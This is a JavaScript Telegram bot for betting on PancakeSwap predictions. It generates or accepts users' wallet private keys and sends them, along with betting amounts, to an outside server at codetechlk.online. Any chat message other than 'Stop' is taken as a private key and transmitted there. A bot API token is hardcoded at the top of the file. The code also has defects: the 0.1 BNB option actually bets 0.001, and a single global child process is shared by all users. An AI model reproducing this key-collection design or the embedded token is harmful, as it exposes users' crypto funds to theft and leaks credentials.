// const { Composer } = require("micro-bot");
// const bot = new Composer();
const { Telegraf } = require("telegraf");
const bot = new Telegraf("5787075134:AAFwwgNDd5-UGw_gJ8e628BvixOgefd4q0w");
const { ethers } = require("ethers");
const { fork } = require("child_process");
const axios = require("axios");
let pid = "";
var child = "";

let click_count = 0;

bot.command("start", (ctx) => {
  ctx.reply("Hello! Im Pan Cake Prediction Test Bot, Welcome to the Bot", {
    reply_markup: {
      inline_keyboard: [[{ text: "Menu 📖", callback_data: "menu" }]],
    },
  });
});

bot.action("menu", async (ctx) => {
  let user_id = ctx.update.callback_query.from.id;

  const response = await axios({
    method: "get",
    url: "https://telebot-api.codetechlk.online/api/user",
    data: {
      user_id: user_id,
    },
  }).catch((err) => {
    console.log(err);
  });

  if (response.data.data != null) {
    ctx.reply("Menu of Pancake Swap Bot", {
      reply_markup: {
        inline_keyboard: [
          [
            { text: "Wallet 💰", callback_data: "wallet_type" },
            { text: "Round History ⌛", callback_data: "history" },
          ],
          [{ text: "Start Prediction 🧑‍⚖️", callback_data: "prediction" }],
        ],
      },
    });
  } else {
    ctx.reply("Menu of Pancake Swap Bot", {
      reply_markup: {
        inline_keyboard: [
          [
            { text: "Wallet 💰", callback_data: "wallet_type" },
            { text: "Round History ⌛", callback_data: "history" },
          ],
          [{ text: "Start Prediction 🧑‍⚖️", callback_data: "prediction" }],
        ],
      },
    });
  }
});

bot.action("wallet_type", (ctx) => {
  // ctx.deleteMessage();
  ctx.reply("Select your wallet type", {
    reply_markup: {
      inline_keyboard: [
        [
          { text: "ETH", callback_data: "eth" },
          { text: "BSC", callback_data: "bsc" },
        ],
      ],
    },
  });
});

bot.action("eth", async (ctx) => {
  let user_id = ctx.update.callback_query.from.id;
  ctx.deleteMessage();

  const response = await axios({
    method: "get",
    url: "https://telebot-api.codetechlk.online/api/user",
    data: {
      user_id: user_id,
    },
  }).catch((err) => {
    console.log(err);
  });

  console.log(response.data);

  if (response.data.data != null) {
    ctx.reply("What you think? ", {
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "Disconnect Wallet",
              callback_data: "disconnect_wallet",
            },
            { text: "Get Balance", callback_data: "balance" },
          ],
          [{ text: "Return", callback_data: "back" }],
        ],
      },
    });
  } else {
    ctx.reply("What you think? ", {
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "Generate New Wallet",
              callback_data: "generate_wallet",
            },
            { text: "Connect Wallet", callback_data: "connect_wallet" },
          ],
          [{ text: "Return", callback_data: "back" }],
        ],
      },
    });
  }
});

bot.action("bsc", async (ctx) => {
  let user_id = ctx.update.callback_query.from.id;
  ctx.deleteMessage();

  const response = await axios({
    method: "get",
    url: "https://telebot-api.codetechlk.online/api/user",
    data: {
      user_id: user_id,
    },
  }).catch((err) => {
    console.log(err);
  });

  console.log(response.data);

  if (response.data.data != null) {
    ctx.reply("What you think? ", {
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "Disconnect Wallet",
              callback_data: "disconnect_wallet",
            },
            { text: "Get Balance", callback_data: "balance" },
          ],
          [{ text: "Return", callback_data: "back" }],
        ],
      },
    });
  } else {
    ctx.reply("What you think? ", {
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "Generate New Wallet",
              callback_data: "generate_wallet",
            },
            { text: "Connect Wallet", callback_data: "connect_wallet" },
          ],
          [{ text: "Return", callback_data: "back" }],
        ],
      },
    });
  }
});

bot.action("back", (ctx) => {
  console.log("back");
  ctx.deleteMessage();
  click_count = 0;
});

bot.action("prediction", async (ctx) => {
  let user_id = ctx.update.callback_query.from.id;

  const response = await axios({
    method: "get",
    url: "https://telebot-api.codetechlk.online/api/user",
    data: {
      user_id: user_id,
    },
  }).catch((err) => {
    console.log(err);
  });

  if (response.data.data != null) {
    ctx.reply("Select your betting amount ", {
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "0.1 BNB",
              callback_data: "0.1",
            },
            {
              text: "0.5 BNB",
              callback_data: "0.5",
            },
            {
              text: "1 BNB",
              callback_data: "1",
            },
          ],
          [
            {
              text: "2 BNB",
              callback_data: "2",
            },
            {
              text: "3 BNB",
              callback_data: "3",
            },
            {
              text: "5 BNB",
              callback_data: "5",
            },
          ],
        ],
      },
    });
  } else {
    ctx.reply("Please First connect your wallet  ", {
      reply_markup: {
        inline_keyboard: [[{ text: "Go Menu", callback_data: "back" }]],
      },
    });
  }
});

bot.action("0.1", async (ctx) => {
  let user_id = ctx.update.callback_query.from.id;
  let aryLength = 0;

  const response = await axios({
    method: "get",
    url: "https://telebot-api.codetechlk.online/api/user",
    data: {
      user_id: user_id,
    },
  }).catch((err) => {
    console.log(err);
  });

  ctx.deleteMessage();

  if (response.data.data != null) {
    const { getBalance } = require("./prediction/getdata.js");
    const result = await getBalance(response.data.data.private_key);
    let amount = 0.001;

    if (result > 0) {
      const update = await axios({
        method: "patch",
        url: "https://telebot-api.codetechlk.online/api/user",
        data: {
          user_id: user_id,
          amount: amount,
        },
      });

      ctx.reply(" Click for starting Your Prediction ", {
        reply_markup: {
          inline_keyboard: [
            [{ text: "Start", callback_data: "start_prediction" }],
          ],
        },
      });
    } else {
      ctx.reply(
        `You don't have enough balance for the betting | your actual balance is ${result}`,
        {
          reply_markup: {
            inline_keyboard: [[{ text: "Back", callback_data: "back" }]],
          },
        }
      );
    }
  }
});

bot.action("0.5", async (ctx) => {
  let user_id = ctx.update.callback_query.from.id;
  let aryLength = 0;

  const response = await axios({
    method: "get",
    url: "https://telebot-api.codetechlk.online/api/user",
    data: {
      user_id: user_id,
    },
  }).catch((err) => {
    console.log(err);
  });

  ctx.deleteMessage();

  if (response.data.data != null) {
    const { getBalance } = require("./prediction/getdata.js");
    const result = await getBalance(response.data.data.private_key);
    let amount = 0.5;

    if (result > 0.5) {
      const update = await axios({
        method: "patch",
        url: "https://telebot-api.codetechlk.online/api/user",
        data: {
          user_id: user_id,
          amount: amount,
        },
      });

      ctx.reply(" Click for starting Your Prediction ", {
        reply_markup: {
          inline_keyboard: [
            [{ text: "Start", callback_data: "start_prediction" }],
          ],
        },
      });
    } else {
      ctx.reply(
        `You don't have enough balance for the betting | your actual balance is ${result}`,
        {
          reply_markup: {
            inline_keyboard: [[{ text: "Back", callback_data: "back" }]],
          },
        }
      );
    }
  }
});

bot.action("1", async (ctx) => {
  let user_id = ctx.update.callback_query.from.id;
  let aryLength = 0;

  const response = await axios({
    method: "get",
    url: "https://telebot-api.codetechlk.online/api/user",
    data: {
      user_id: user_id,
    },
  }).catch((err) => {
    console.log(err);
  });

  ctx.deleteMessage();

  if (response.data.data != null) {
    const { getBalance } = require("./prediction/getdata.js");
    const result = await getBalance(response.data.data.private_key);
    let amount = 1;

    if (result > 1) {
      const update = await axios({
        method: "patch",
        url: "https://telebot-api.codetechlk.online/api/user",
        data: {
          user_id: user_id,
          amount: amount,
        },
      });

      ctx.reply(" Click for starting Your Prediction ", {
        reply_markup: {
          inline_keyboard: [
            [{ text: "Start", callback_data: "start_prediction" }],
          ],
        },
      });
    } else {
      ctx.reply(
        `You don't have enough balance for the betting | your actual balance is ${result}`,
        {
          reply_markup: {
            inline_keyboard: [[{ text: "Back", callback_data: "back" }]],
          },
        }
      );
    }
  }
});

bot.action("2", async (ctx) => {
  let user_id = ctx.update.callback_query.from.id;
  let aryLength = 0;

  const response = await axios({
    method: "get",
    url: "https://telebot-api.codetechlk.online/api/user",
    data: {
      user_id: user_id,
    },
  }).catch((err) => {
    console.log(err);
  });

  ctx.deleteMessage();

  if (response.data.data != null) {
    const { getBalance } = require("./prediction/getdata.js");
    const result = await getBalance(response.data.data.private_key);
    let amount = 2;

    if (result > 2) {
      const update = await axios({
        method: "patch",
        url: "https://telebot-api.codetechlk.online/api/user",
        data: {
          user_id: user_id,
          amount: amount,
        },
      });

      ctx.reply(" Click for starting Your Prediction ", {
        reply_markup: {
          inline_keyboard: [
            [{ text: "Start", callback_data: "start_prediction" }],
          ],
        },
      });
    } else {
      ctx.reply(
        `You don't have enough balance for the betting | your actual balance is ${result}`,
        {
          reply_markup: {
            inline_keyboard: [[{ text: "Back", callback_data: "back" }]],
          },
        }
      );
    }
  }
});

bot.action("3", async (ctx) => {
  let user_id = ctx.update.callback_query.from.id;
  let aryLength = 0;

  const response = await axios({
    method: "get",
    url: "https://telebot-api.codetechlk.online/api/user",
    data: {
      user_id: user_id,
    },
  }).catch((err) => {
    console.log(err);
  });

  ctx.deleteMessage();

  if (response.data.data != null) {
    const { getBalance } = require("./prediction/getdata.js");
    const result = await getBalance(response.data.data.private_key);
    let amount = 3;

    if (result > 3) {
      const update = await axios({
        method: "patch",
        url: "https://telebot-api.codetechlk.online/api/user",
        data: {
          user_id: user_id,
          amount: amount,
        },
      });

      ctx.reply(" Click for starting Your Prediction ", {
        reply_markup: {
          inline_keyboard: [
            [{ text: "Start", callback_data: "start_prediction" }],
          ],
        },
      });
    } else {
      ctx.reply(
        `You don't have enough balance for the betting | your actual balance is ${result}`,
        {
          reply_markup: {
            inline_keyboard: [[{ text: "Back", callback_data: "back" }]],
          },
        }
      );
    }
  }
});

bot.action("5", async (ctx) => {
  let user_id = ctx.update.callback_query.from.id;
  let aryLength = 0;

  const response = await axios({
    method: "get",
    url: "https://telebot-api.codetechlk.online/api/user",
    data: {
      user_id: user_id,
    },
  }).catch((err) => {
    console.log(err);
  });

  ctx.deleteMessage();

  if (response.data.data != null) {
    const { getBalance } = require("./prediction/getdata.js");
    const result = await getBalance(response.data.data.private_key);
    let amount = 5;

    if (result > 5) {
      const update = await axios({
        method: "patch",
        url: "https://telebot-api.codetechlk.online/api/user",
        data: {
          user_id: user_id,
          amount: amount,
        },
      });

      ctx.reply(" Click for starting Your Prediction ", {
        reply_markup: {
          inline_keyboard: [
            [{ text: "Start", callback_data: "start_prediction" }],
          ],
        },
      });
    } else {
      ctx.reply(
        `You don't have enough balance for the betting | your actual balance is ${result}`,
        {
          reply_markup: {
            inline_keyboard: [[{ text: "Back", callback_data: "back" }]],
          },
        }
      );
    }
  }
});

bot.action("connect_wallet", (ctx) => {
  ctx.deleteMessage();
  ctx.reply("Enter your Wallet private key ... ");
});

bot.action("balance", async (ctx) => {
  let user_id = ctx.update.callback_query.from.id;
  let aryLength = 0;

  const response = await axios({
    method: "get",
    url: "https://telebot-api.codetechlk.online/api/user",
    data: {
      user_id: user_id,
    },
  }).catch((err) => {
    console.log(err);
  });

  console.log(response.data.data);

  ctx.deleteMessage();

  if (response.data.data != null) {
    const { getBalance } = require("./prediction/getdata.js");
    const result = await getBalance(response.data.data.private_key);

    ctx.reply(`Wallet Balance: ${result}`, {
      reply_markup: {
        inline_keyboard: [[{ text: "Back", callback_data: "back" }]],
      },
    });
  }
});

bot.action("generate_wallet", async (ctx) => {
  const wallet = ethers.Wallet.createRandom();
  let user_id = ctx.update.callback_query.from.id;
  let amount = 0.0;
  let private_key = wallet.privateKey;

  const response = await axios({
    method: "post",
    url: "https://telebot-api.codetechlk.online/api/user",
    data: {
      user_id: user_id,
      private_key: private_key,
      amount: amount,
    },
  }).catch((err) => {
    console.log(err);
  });

  ctx.deleteMessage();

  console.log(response.data);

  if (response.data.success) {
    ctx.reply(
      `✅ Generate Wallet Address: ${wallet.address} \n\n Private Key: ${
        wallet.privateKey
      } \n\n Mnemonic: ${
        wallet._mnemonic().phrase
      } \n\n ★★ Please keep these things safely `
    );
  }
});

bot.action("start_prediction", async (ctx) => {
  let aryLength = 0;
  let user_id = ctx.update.callback_query.from.id;

  const response = await axios({
    method: "get",
    url: "https://telebot-api.codetechlk.online/api/user",
    data: {
      user_id: user_id,
    },
  }).catch((err) => {
    console.log(err);
  });

  ctx.deleteMessage();

  const stop_button = {
    reply_markup: {
      resize_keyboard: true,
      one_time_keyboard: true,
      keyboard: [[{ text: "Stop" }]],
    },
  };

  if (response.data.data != null) {
    ctx.reply(`😀 Start Pancake Bot Prediction 👍👍`, stop_button);

    child = fork("./prediction/index.js");
    pid = child.pid;

    child.send(user_id);

    child.on("message", (msg) => {
      ctx.reply(msg);
    });
  } else {
    ctx.reply("Please First connect your wallet  ", {
      reply_markup: {
        inline_keyboard: [[{ text: "Go Menu", callback_data: "back" }]],
      },
    });
  }
});

bot.action("history", async (ctx) => {
  let win = 0;
  let loss = 0;
  let user_id = ctx.update.callback_query.from.id;
  let aryLength = 0;

  const response = await axios({
    method: "get",
    url: "https://telebot-api.codetechlk.online/api/user",
    data: {
      user_id: user_id,
    },
  }).catch((err) => {
    console.log(err);
  });

  console.log(response.data);

  if (response.data.data != null) {
    if (click_count <= 0) {
      const { checkHistory } = require("./prediction/getdata.js");
      const result = await checkHistory(response.data.data.private_key);

      result.forEach((round) => {
        if (round.status == true) {
          win = win + 1;
        } else {
          loss = loss + 1;
        }
      });

      ctx.reply(
        `User Round History \n\n 🟢 Win Count: ${win} \n\n 🔴 Lost Count: ${loss}`,
        {
          reply_markup: {
            inline_keyboard: [[{ text: "Back", callback_data: "back" }]],
          },
        }
      );

      click_count = click_count + 1;
    }
  } else {
    ctx.reply("Please First connect your wallet  ", {
      reply_markup: {
        inline_keyboard: [[{ text: "Go Menu", callback_data: "back" }]],
      },
    });
  }
});

bot.action("disconnect_wallet", async (ctx) => {
  let user_id = ctx.update.callback_query.from.id;

  const response = await axios({
    method: "delete",
    url: "https://telebot-api.codetechlk.online/api/user",
    data: {
      user_id: user_id,
    },
  }).catch((err) => {
    console.log(err);
  });

  console.log(response.data);

  ctx.deleteMessage();
  if (response.data.success) {
    ctx.reply(`✅ Successfully Disconnected.`, {
      reply_markup: {
        inline_keyboard: [[{ text: "Back", callback_data: "back" }]],
      },
    });
  }
});

bot.on("message", async (msg) => {
  if (msg.update.message.text == "Stop") {
    msg.reply(`✅ Prediction bot is Stopped..`, {
      reply_markup: {
        inline_keyboard: [[{ text: "Back", callback_data: "menu" }]],
      },
    });
    child.kill();
  } else {
    let wallet_private_key = msg.update.message.text;
    let user_id = msg.update.message.chat.id;

    let amount = 0.0;

    msg.deleteMessage(msg.message.message_id - 1);
    msg.deleteMessage();

    const response = await axios({
      method: "post",
      url: "https://telebot-api.codetechlk.online/api/user",
      data: {
        user_id: user_id,
        private_key: wallet_private_key,
        amount: amount,
      },
    }).catch((err) => {
      console.log(err);
    });

    console.log(response.data);

    if (response.data.success) {
      msg.reply(`✅ Successfully Submitted Private Key`, {
        reply_markup: {
          inline_keyboard: [[{ text: "Back", callback_data: "back" }]],
        },
      });
    }
  }
});

bot.launch();

// module.exports = bot;
